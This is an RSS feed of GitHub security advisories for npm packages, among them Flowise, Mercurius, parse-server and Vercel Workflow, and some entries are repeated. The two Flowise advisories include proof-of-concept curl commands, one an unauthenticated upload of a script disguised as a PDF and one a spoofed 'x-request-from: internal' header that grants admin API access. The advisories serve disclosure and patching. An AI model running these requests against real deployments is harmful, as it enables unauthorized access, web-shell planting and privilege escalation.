<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-06T20:03:57.263Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise has Arbitrary File Upload via MIME Spoofing]]></title>
        <id>https://github.com/advisories/GHSA-j8g8-j7fc-43v6</id>
        <link href="https://github.com/advisories/GHSA-j8g8-j7fc-43v6"/>
        <updated>2026-03-06T18:49:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="vulnerability-description">Vulnerability <strong>Description</strong></h3>
<hr>
<p><strong>Vulnerability Overview</strong></p>
<ul>
<li>The <code>/api/v1/attachments/:chatflowId/:chatId</code> endpoint is listed in <code>WHITELIST_URLS</code>, allowing unauthenticated access to the file upload API.</li>
<li>While the server validates uploads based on the MIME types defined in <code>chatbotConfig.fullFileUpload.allowedUploadFileTypes</code>, it implicitly trusts the client-provided <code>Content-Type</code> header (<code>file.mimetype</code>) without verifying the file's actual content (magic bytes) or extension (<code>file.originalname</code>).</li>
<li>Consequently, an attacker can bypass this restriction by spoofing the <code>Content-Type</code> as a permitted type (e.g., <code>application/pdf</code>) while uploading malicious scripts or arbitrary files. Once uploaded via <code>addArrayFilesToStorage</code>, these files persist in backend storage (S3, GCS, or local disk). This vulnerability serves as a critical entry point that, when chained with other features like static hosting or file retrieval, can lead to Stored XSS, malicious file hosting, or Remote Code Execution (RCE).</li>
</ul>
<p><strong>Vulnerable Code</strong></p>
<ul>
<li><p>Upload Route Definition</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/routes/attachments/index.ts#L7-L10">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/routes/attachments/index.ts#L7-L10</a></p>
<pre><code class="language-tsx">// CREATE
router.post('/:chatflowId/:chatId', getMulterStorage().array('files'), attachmentsController.createAttachment)
export default router
</code></pre>
</li>
<li><p>Mount /api/v1/attachments to the global router</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/routes/index.ts#L72-L77">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/routes/index.ts#L72-L77</a></p>
<pre><code class="language-tsx">const router = express.Router()
router.use('/ping', pingRouter)
router.use('/apikey', apikeyRouter)
router.use('/assistants', assistantsRouter)
router.use('/attachments', attachmentsRouter)
</code></pre>
</li>
<li><p>Include /api/v1/attachments in the WHITELIST_URLS list</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/constants.ts#L6-L26">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/constants.ts#L6-L26</a></p>
<pre><code class="language-tsx">export const WHITELIST_URLS = [
    '/api/v1/verify/apikey/',
    '/api/v1/chatflows/apikey/',
    '/api/v1/public-chatflows',
    '/api/v1/public-chatbotConfig',
    '/api/v1/public-executions',
    '/api/v1/prediction/',
    '/api/v1/vector/upsert/',
    '/api/v1/node-icon/',
    '/api/v1/components-credentials-icon/',
    '/api/v1/chatflows-streaming',
    '/api/v1/chatflows-uploads',
    '/api/v1/openai-assistants-file/download',
    '/api/v1/feedback',
    '/api/v1/leads',
    '/api/v1/get-upload-file',
    '/api/v1/ip',
    '/api/v1/ping',
    '/api/v1/version',
    '/api/v1/attachments',
    '/api/v1/metrics',
</code></pre>
</li>
<li><p>Bypass JWT validation if the URL is whitelisted</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/index.ts#L213-L228">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/index.ts#L213-L228</a></p>
<pre><code class="language-tsx">        const denylistURLs = process.env.DENYLIST_URLS ? process.env.DENYLIST_URLS.split(',') : []
        const whitelistURLs = WHITELIST_URLS.filter((url) =&gt; !denylistURLs.includes(url))
        const URL_CASE_INSENSITIVE_REGEX: RegExp = /\/api\/v1\//i
        const URL_CASE_SENSITIVE_REGEX: RegExp = /\/api\/v1\//

        await initializeJwtCookieMiddleware(this.app, this.identityManager)

        this.app.use(async (req, res, next) =&gt; {
            // Step 1: Check if the req path contains /api/v1 regardless of case
            if (URL_CASE_INSENSITIVE_REGEX.test(req.path)) {
                // Step 2: Check if the req path is casesensitive
                if (URL_CASE_SENSITIVE_REGEX.test(req.path)) {
                    // Step 3: Check if the req path is in the whitelist
                    const isWhitelisted = whitelistURLs.some((url) =&gt; req.path.startsWith(url))
                    if (isWhitelisted) {
                        next()
</code></pre>
</li>
<li><p>Multer Configuration: Saves files without file type validation</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/index.ts#L1917-L1960">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/index.ts#L1917-L1960</a></p>
<pre><code class="language-tsx">export const getUploadPath = (): string =&gt; {
    return process.env.BLOB_STORAGE_PATH
        ? path.join(process.env.BLOB_STORAGE_PATH, 'uploads')
        : path.join(getUserHome(), '.flowise', 'uploads')
}

export function generateId() {
    return uuidv4()
}

export const getMulterStorage = () =&gt; {
    const storageType = process.env.STORAGE_TYPE ? process.env.STORAGE_TYPE : 'local'

    if (storageType === 's3') {
        const s3Client = getS3Config().s3Client
        const Bucket = getS3Config().Bucket

        const upload = multer({
            storage: multerS3({
                s3: s3Client,
                bucket: Bucket,
                metadata: function (req, file, cb) {
                    cb(null, { fieldName: file.fieldname, originalName: file.originalname })
                },
                key: function (req, file, cb) {
                    cb(null, `${generateId()}`)
                }
            })
        })
        return upload
    } else if (storageType === 'gcs') {
        return multer({
            storage: new MulterGoogleCloudStorage({
                projectId: process.env.GOOGLE_CLOUD_STORAGE_PROJ_ID,
                bucket: process.env.GOOGLE_CLOUD_STORAGE_BUCKET_NAME,
                keyFilename: process.env.GOOGLE_CLOUD_STORAGE_CREDENTIAL,
                uniformBucketLevelAccess: Boolean(process.env.GOOGLE_CLOUD_UNIFORM_BUCKET_ACCESS) ?? true,
                destination: `uploads/${generateId()}`
            })
        })
    } else {
        return multer({ dest: getUploadPath() })
    }
}
</code></pre>
</li>
<li><p>Transfers uploaded files to storage without verification</p>
<p>  <a href="https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/createAttachment.ts#L124-L158">https://github.com/FlowiseAI/Flowise/blob/d17c4394a238b49327b493c89feee45f3a20bb91/packages/server/src/utils/createAttachment.ts#L124-L158</a></p>
<pre><code class="language-tsx">    const files = (req.files as Express.Multer.File[]) || []
    const fileAttachments = []
    if (files.length) {
        const isBase64 = req.body.base64
        for (const file of files) {
            if (!allowedFileTypes.length) {
                throw new InternalFlowiseError(
                    StatusCodes.BAD_REQUEST,
                    `File type '${file.mimetype}' is not allowed. Allowed types: ${allowedFileTypes.join(', ')}`
                )
            }

            // Validate file type against allowed types
            if (allowedFileTypes.length &gt; 0 &amp;&amp; !allowedFileTypes.includes(file.mimetype)) {
                throw new InternalFlowiseError(
                    StatusCodes.BAD_REQUEST,
                    `File type '${file.mimetype}' is not allowed. Allowed types: ${allowedFileTypes.join(', ')}`
                )
            }

            await checkStorage(orgId, subscriptionId, appServer.usageCacheManager)

            const fileBuffer = await getFileFromUpload(file.path ?? file.key)
            const fileNames: string[] = []
            // Address file name with special characters: https://github.com/expressjs/multer/issues/1104
            file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf8')
            const { path: storagePath, totalSize } = await addArrayFilesToStorage(
                file.mimetype,
                fileBuffer,
                file.originalname,
                fileNames,
                orgId,
                chatflowid,
                chatId
            )
</code></pre>
</li>
</ul>
<h3 id="poc">PoC</h3>
<hr>
<p><strong>PoC Description</strong></p>
<ul>
<li>Create a local file named <code>shell.js</code> containing arbitrary JavaScript code (or a malicious payload).</li>
<li>Send a <code>multipart/form-data</code> request to the <code>/api/v1/attachments/891f64a2-a26f-4169-b333-905dc96c200a/:chatId</code> endpoint without any authentication (login, session, or API keys).</li>
<li>During the upload, retain the filename as <code>shell.js</code> but spoof the <code>Content-Type</code> header as <code>application/pdf</code>.</li>
<li>This exploits the server's reliance solely on the client-provided <code>file.mimetype</code>, forcing it to process the malicious JS file as an allowed PDF, thereby confirming unauthenticated arbitrary file upload.</li>
</ul>
<p><strong>PoC</strong></p>
<pre><code class="language-bash">curl -X POST \
  "http://localhost:3000/api/v1/attachments/891f64a2-a26f-4169-b333-905dc96c200a/$(uuidgen)" \
  -F "files=@shell.js;type=application/pdf"
</code></pre>
<img src="https://github.com/user-attachments/assets/45679d95-00b9-4bee-9c94-7bd9403554d5" alt="image" height="1011" width="1916">


<h3 id="impact">Impact</h3>
<hr>
<p><strong>1. Root Cause</strong>
The vulnerability stems from relying solely on the MIME type without cross-validating the file extension or actual content. This allows attackers to upload executable files (e.g., <code>.js</code>, <code>.php</code>) or malicious scripts (<code>.html</code>) by masquerading them as benign images or documents.</p>
<p><strong>2. Key Attack Scenarios</strong></p>
<ul>
<li><strong>Server Compromise (RCE):</strong> An attacker uploads a <strong>Web Shell</strong> and triggers its execution on the server. Successful exploitation grants system privileges, allowing unauthorized access to internal data and full control over the server.</li>
<li><strong>Client-Side Attack (Stored XSS):</strong> An attacker uploads files containing malicious scripts (e.g., HTML, SVG). When a victim views the file, the script executes within their browser, leading to session cookie theft and account takeover.</li>
</ul>
<p><strong>3. Impact</strong>
This vulnerability is rated as <strong>High</strong> severity. The risk is particularly critical if the system utilizes shared storage (e.g., S3, GCS) or static hosting features, as the compromise could spread to the entire infrastructure and affect other tenants.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-j8g8-j7fc-43v6">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-j8g8-j7fc-43v6</a></li>
<li><a href="https://github.com/advisories/GHSA-j8g8-j7fc-43v6">https://github.com/advisories/GHSA-j8g8-j7fc-43v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8g8-j7fc-43v6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:49:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise has Authorization Bypass via Spoofed x-request-from Header]]></title>
        <id>https://github.com/advisories/GHSA-wvhq-wp8g-c7vq</id>
        <link href="https://github.com/advisories/GHSA-wvhq-wp8g-c7vq"/>
        <updated>2026-03-06T18:48:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Flowise trusts any HTTP client that sets the header <code>x-request-from: internal</code>, allowing an authenticated tenant session to bypass all <code>/api/v1/**</code> authorization checks. With only a browser cookie, a low-privilege tenant can invoke internal administration endpoints (API key management, credential stores, custom function execution, etc.), effectively escalating privileges.</p>
<h3 id="details">Details</h3>
<p>The global middleware that guards <code>/api/v1</code> routes lives in <code>external/Flowise/packages/server/src/index.ts:214</code>. After filtering out the whitelist, the logic short-circuits on the spoofable header:</p>
<pre><code class="language-javascript">if (isWhitelisted) {
    next();
} else if (req.headers['x-request-from'] === 'internal') {
    verifyToken(req, res, next);
} else {
    const { isValid } = await validateAPIKey(req);
    if (!isValid) return res.status(401).json({ error: 'Unauthorized Access' });
    … // owner context stitched from API key
}
</code></pre>
<p>Because the middle branch blindly calls verifyToken, any tenant that already has a UI session cookie is treated as an internal client simply by adding that header. No additional permission checks are performed before <code>next()</code> executes, so every downstream router under <code>/api/v1</code> becomes reachable.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Log into Flowise 3.0.8 and capture cookies (e.g., <code>curl -c /tmp/flowise_cookies.txt … /api/v1/auth/login</code>).</li>
<li>Invoke an internal-only endpoint with the spoofed header:</li>
</ol>
<pre><code class="language-bash">    curl -sS -b /tmp/flowise_cookies.txt \
      -H 'Content-Type: application/json' \
      -H 'x-request-from: internal' \
      -X POST http://127.0.0.1:3100/api/v1/apikey \
      -d '{"keyName":"Bypass Demo"}'
</code></pre>
<pre><code>The server returns HTTP 200 and the newly created key object.
</code></pre>
<ol start="3">
<li>Remove the header and retry:</li>
</ol>
<pre><code class="language-bash">    curl -sS -b /tmp/flowise_cookies.txt \
      -H 'Content-Type: application/json' \
      -X POST http://127.0.0.1:3100/api/v1/apikey \
      -d '{"keyName":"Bypass Demo"}'
</code></pre>
<pre><code>This yields {"error":"Unauthorized Access"}, confirming the header alone controls access.
</code></pre>
<p>The same spoof grants access to other privileged routes like <code>/api/v1/credentials</code>, <code>/api/v1/tools</code>, <code>/api/v1/node-custom-function</code>, etc.</p>
<h3 id="impact">Impact</h3>
<p>This is an authorization bypass / privilege escalation. Any authenticated tenant (even without API keys or elevated roles) can execute internal administration APIs solely from the browser, enabling actions such as minting new API keys, harvesting stored secrets, and, when combined with other flaws (e.g., Custom Function RCE), full system compromise. All self-hosted Flowise 3.0.8 deployments that rely on the default middleware are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wvhq-wp8g-c7vq">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wvhq-wp8g-c7vq</a></li>
<li><a href="https://github.com/advisories/GHSA-wvhq-wp8g-c7vq">https://github.com/advisories/GHSA-wvhq-wp8g-c7vq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvhq-wp8g-c7vq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mercurius] Mercurius's queryDepth limit bypassed for WebSocket subscriptions]]></title>
        <id>https://github.com/advisories/GHSA-m4h2-mjfm-mp55</id>
        <link href="https://github.com/advisories/GHSA-m4h2-mjfm-mp55"/>
        <updated>2026-03-06T18:47:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Mercurius fails to enforce the configured queryDepth limit on GraphQL subscription queries received over WebSocket connections. The depth check is correctly applied to HTTP queries and mutations, but subscription queries are parsed and executed without invoking the depth validation. This allows a remote client to submit arbitrarily deeply nested subscription queries over WebSocket, bypassing the intended depth restriction. On schemas with recursive types, this can lead to denial of service through exponential data resolution on each subscription event.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Disable subscriptions and, in general, queries over the WebSocket.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mercurius-js/mercurius/security/advisories/GHSA-m4h2-mjfm-mp55">https://github.com/mercurius-js/mercurius/security/advisories/GHSA-m4h2-mjfm-mp55</a></li>
<li><a href="https://github.com/mercurius-js/mercurius/commit/5b56f60f4b0d60780b0ff499a479bd830bdd6986">https://github.com/mercurius-js/mercurius/commit/5b56f60f4b0d60780b0ff499a479bd830bdd6986</a></li>
<li><a href="https://github.com/advisories/GHSA-m4h2-mjfm-mp55">https://github.com/advisories/GHSA-m4h2-mjfm-mp55</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4h2-mjfm-mp55</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-06T18:47:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] parse-server's endpoint `/loginAs` allows `readOnlyMasterKey` to gain full read and write access as any user]]></title>
        <id>https://github.com/advisories/GHSA-79wj-8rqv-jvp5</id>
        <link href="https://github.com/advisories/GHSA-79wj-8rqv-jvp5"/>
        <updated>2026-03-06T18:46:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>readOnlyMasterKey</code> can call <code>POST /loginAs</code> to obtain a valid session token for any user. This allows a read-only credential to impersonate arbitrary users with full read and write access to their data. Any Parse Server deployment that uses <code>readOnlyMasterKey</code> is affected.</p>
<h3 id="patches">Patches</h3>
<p>The fix adds a check to the <code>/logInAs</code> handler.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than not using <code>readOnlyMasterKey</code>.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5</a></li>
<li>Fix for Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.4">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.4</a></li>
<li>Fix for Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.6">https://github.com/parse-community/parse-server/releases/tag/8.6.6</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5</a></li>
<li><a href="https://github.com/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/advisories/GHSA-79wj-8rqv-jvp5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79wj-8rqv-jvp5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:46:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] parse-server's endpoint `/loginAs` allows `readOnlyMasterKey` to gain full read and write access as any user]]></title>
        <id>https://github.com/advisories/GHSA-79wj-8rqv-jvp5</id>
        <link href="https://github.com/advisories/GHSA-79wj-8rqv-jvp5"/>
        <updated>2026-03-06T18:46:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>readOnlyMasterKey</code> can call <code>POST /loginAs</code> to obtain a valid session token for any user. This allows a read-only credential to impersonate arbitrary users with full read and write access to their data. Any Parse Server deployment that uses <code>readOnlyMasterKey</code> is affected.</p>
<h3 id="patches">Patches</h3>
<p>The fix adds a check to the <code>/logInAs</code> handler.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than not using <code>readOnlyMasterKey</code>.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5</a></li>
<li>Fix for Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.4">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.4</a></li>
<li>Fix for Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.6">https://github.com/parse-community/parse-server/releases/tag/8.6.6</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/parse-community/parse-server/security/advisories/GHSA-79wj-8rqv-jvp5</a></li>
<li><a href="https://github.com/advisories/GHSA-79wj-8rqv-jvp5">https://github.com/advisories/GHSA-79wj-8rqv-jvp5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79wj-8rqv-jvp5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-06T18:46:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] parse-server's file creation and deletion bypasses `readOnlyMasterKey` write restriction]]></title>
        <id>https://github.com/advisories/GHSA-xfh7-phr7-gr2x</id>
        <link href="https://github.com/advisories/GHSA-xfh7-phr7-gr2x"/>
        <updated>2026-03-06T18:45:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>readOnlyMasterKey</code> can be used to create and delete files via the Files API (<code>POST /files/:filename</code>, <code>DELETE /files/:filename</code>). This bypasses the read-only restriction which violates the access scope of the <code>readOnlyMasterKey</code>.</p>
<p>Any Parse Server deployment that uses <code>readOnlyMasterKey</code> and exposes the Files API is affected. An attacker with access to the <code>readOnlyMasterKey</code> can upload arbitrary files or delete existing files.</p>
<h3 id="patches">Patches</h3>
<p>The fix adds permission checks to both the file upload and file delete handlers.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than not using <code>readOnlyMasterKey</code>, or restricting network access to the Files API endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x</a></li>
<li>Fix for Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.3">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.3</a></li>
<li>Fix for Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.5">https://github.com/parse-community/parse-server/releases/tag/8.6.5</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x</a></li>
<li><a href="https://github.com/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/advisories/GHSA-xfh7-phr7-gr2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfh7-phr7-gr2x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-06T18:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] parse-server's file creation and deletion bypasses `readOnlyMasterKey` write restriction]]></title>
        <id>https://github.com/advisories/GHSA-xfh7-phr7-gr2x</id>
        <link href="https://github.com/advisories/GHSA-xfh7-phr7-gr2x"/>
        <updated>2026-03-06T18:45:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>readOnlyMasterKey</code> can be used to create and delete files via the Files API (<code>POST /files/:filename</code>, <code>DELETE /files/:filename</code>). This bypasses the read-only restriction which violates the access scope of the <code>readOnlyMasterKey</code>.</p>
<p>Any Parse Server deployment that uses <code>readOnlyMasterKey</code> and exposes the Files API is affected. An attacker with access to the <code>readOnlyMasterKey</code> can upload arbitrary files or delete existing files.</p>
<h3 id="patches">Patches</h3>
<p>The fix adds permission checks to both the file upload and file delete handlers.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than not using <code>readOnlyMasterKey</code>, or restricting network access to the Files API endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x</a></li>
<li>Fix for Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.3">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.3</a></li>
<li>Fix for Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.5">https://github.com/parse-community/parse-server/releases/tag/8.6.5</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/parse-community/parse-server/security/advisories/GHSA-xfh7-phr7-gr2x</a></li>
<li><a href="https://github.com/advisories/GHSA-xfh7-phr7-gr2x">https://github.com/advisories/GHSA-xfh7-phr7-gr2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfh7-phr7-gr2x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-06T18:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@workflow/core] Vercel Workflow Allows Webhook Creation with Predictable User-Specified Tokens]]></title>
        <id>https://github.com/advisories/GHSA-9r75-g2cr-3h76</id>
        <link href="https://github.com/advisories/GHSA-9r75-g2cr-3h76"/>
        <updated>2026-03-06T18:45:02.000Z</updated>
        <content type="html"><![CDATA[<p><code>createWebhook()</code> in Vercel Workflow DevKit accepts a user-specified <code>token</code> parameter that serves as the credential for the public webhook endpoint <code>/.well-known/workflow/v1/webhook/{token}</code>. Official documentation recommended predictable token patterns, making it possible for an unauthenticated remote attacker to guess the token and inject arbitrary payloads into the workflow execution context.</p>
<h4 id="impact">Impact</h4>
<p>An attacker who guesses a webhook token can resume the associated workflow with an attacker-controlled HTTP request body, potentially triggering downstream side effects such as API calls, database writes, or deployments.</p>
<h4 id="fix">Fix</h4>
<ul>
<li>Upgrade to version 4.2.0-beta.64. The fix removes the <code>token</code> option from <code>createWebhook()</code> so that webhook tokens are always randomly generated by the SDK.</li>
<li>Runs created with versions prior to 4.2.0-beta.64, that are 1) still active (i.e. running), and 2) have open hooks, are still susceptible to this vulnerability. If users suspect the hook tokens are predictable or leaked - consider cancelling those runs and restarting them on the latest patch.</li>
</ul>
<h4 id="workarounds">Workarounds</h4>
<p>In case a version upgrade is not possible, avoid passing predictable or guessable values to the <code>token</code> parameter of <code>createWebhook()</code>. Instead, users can either</p>
<ul>
<li>switch from <code>createWebhook()</code> to <code>createHook()</code> instead and programmatically resume hooks using <code>resumeHook()</code> instead of the public webhook endpoint, or</li>
<li>use <code>createWebhook()</code> without passing a user-provided <code>token</code>, which uses a non-guessable random <code>nanoid</code> by default.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/workflow/security/advisories/GHSA-9r75-g2cr-3h76">https://github.com/vercel/workflow/security/advisories/GHSA-9r75-g2cr-3h76</a></li>
<li><a href="https://github.com/vercel/workflow/commit/30e24d441e735635ffa4522198e6905d0e51e175">https://github.com/vercel/workflow/commit/30e24d441e735635ffa4522198e6905d0e51e175</a></li>
<li><a href="https://github.com/vercel/workflow/releases/tag/workflow%404.2.0-beta.64">https://github.com/vercel/workflow/releases/tag/workflow%404.2.0-beta.64</a></li>
<li><a href="https://github.com/advisories/GHSA-9r75-g2cr-3h76">https://github.com/advisories/GHSA-9r75-g2cr-3h76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r75-g2cr-3h76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-06T18:45:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[workflow] Vercel Workflow Allows Webhook Creation with Predictable User-Specified Tokens]]></title>
        <id>https://github.com/advisories/GHSA-9r75-g2cr-3h76</id>
        <link href="https://github.com/advisories/GHSA-9r75-g2cr-3h76"/>
        <updated>2026-03-06T18:45:02.000Z</updated>
        <content type="html"><![CDATA[<p><code>createWebhook()</code> in Vercel Workflow DevKit accepts a user-specified <code>token</code> parameter that serves as the credential for the public webhook endpoint <code>/.well-known/workflow/v1/webhook/{token}</code>. Official documentation recommended predictable token patterns, making it possible for an unauthenticated remote attacker to guess the token and inject arbitrary payloads into the workflow execution context.</p>
<h4 id="impact">Impact</h4>
<p>An attacker who guesses a webhook token can resume the associated workflow with an attacker-controlled HTTP request body, potentially triggering downstream side effects such as API calls, database writes, or deployments.</p>
<h4 id="fix">Fix</h4>
<ul>
<li>Upgrade to version 4.2.0-beta.64. The fix removes the <code>token</code> option from <code>createWebhook()</code> so that webhook tokens are always randomly generated by the SDK.</li>
<li>Runs created with versions prior to 4.2.0-beta.64, that are 1) still active (i.e. running), and 2) have open hooks, are still susceptible to this vulnerability. If users suspect the hook tokens are predictable or leaked - consider cancelling those runs and restarting them on the latest patch.</li>
</ul>
<h4 id="workarounds">Workarounds</h4>
<p>In case a version upgrade is not possible, avoid passing predictable or guessable values to the <code>token</code> parameter of <code>createWebhook()</code>. Instead, users can either</p>
<ul>
<li>switch from <code>createWebhook()</code> to <code>createHook()</code> instead and programmatically resume hooks using <code>resumeHook()</code> instead of the public webhook endpoint, or</li>
<li>use <code>createWebhook()</code> without passing a user-provided <code>token</code>, which uses a non-guessable random <code>nanoid</code> by default.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/workflow/security/advisories/GHSA-9r75-g2cr-3h76">https://github.com/vercel/workflow/security/advisories/GHSA-9r75-g2cr-3h76</a></li>
<li><a href="https://github.com/vercel/workflow/commit/30e24d441e735635ffa4522198e6905d0e51e175">https://github.com/vercel/workflow/commit/30e24d441e735635ffa4522198e6905d0e51e175</a></li>
<li><a href="https://github.com/vercel/workflow/releases/tag/workflow%404.2.0-beta.64">https://github.com/vercel/workflow/releases/tag/workflow%404.2.0-beta.64</a></li>
<li><a href="https://github.com/advisories/GHSA-9r75-g2cr-3h76">https://github.com/advisories/GHSA-9r75-g2cr-3h76</a></li>
